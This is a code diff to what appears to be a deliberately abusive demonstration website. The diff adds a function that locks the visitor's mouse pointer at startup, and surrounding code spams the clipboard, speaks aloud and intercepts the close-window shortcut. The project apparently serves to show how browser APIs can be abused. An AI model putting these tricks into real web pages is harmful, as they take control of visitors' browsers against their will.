@@ -208,6 +208,7 @@ function init () {
     focusWindows()
     copySpamToClipboard()
     speak()
+    requestPointerLock()
 
     // Capture key presses on the Command or Control keys, to interfere with the
     // "Close Window" shortcut.
@@ -383,6 +384,10 @@ function requestCameraAndMic () {
  * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
  */
 function animateUrlWithEmojis () {
+  if (window.ApplePaySession) {
+    // Safari doesn't show the full URL anyway, so we can't animate it
+    return
+  }
   const rand = Math.random()
   if (rand < 0.33) {
     animateUrlWithBabies()
@@ -585,6 +590,21 @@ function speak (phrase) {
 }
 
 /**
+ * Lock the user's pointer, without even being in full screen!
+ * Require user-initiated event.
+ */
+function requestPointerLock () {
+  const requestPointerLockApi = (
+    document.body.requestPointerLock ||
+    document.body.webkitRequestPointerLock ||
+    document.body.mozRequestPointerLock ||
+    document.body.msRequestPointerLock
+  )
+
+  requestPointerLockApi.call(document.body)
+}
+
+/**
  * Move the window around the screen and bounce off of the screen edges.
  */
 function moveWindowBounce () {
@@ -731,7 +751,7 @@ function startAlertInterval () {
     } else {
       window.print()
     }
-  }, 10000)
+  }, 30000)
 }
 
 /**
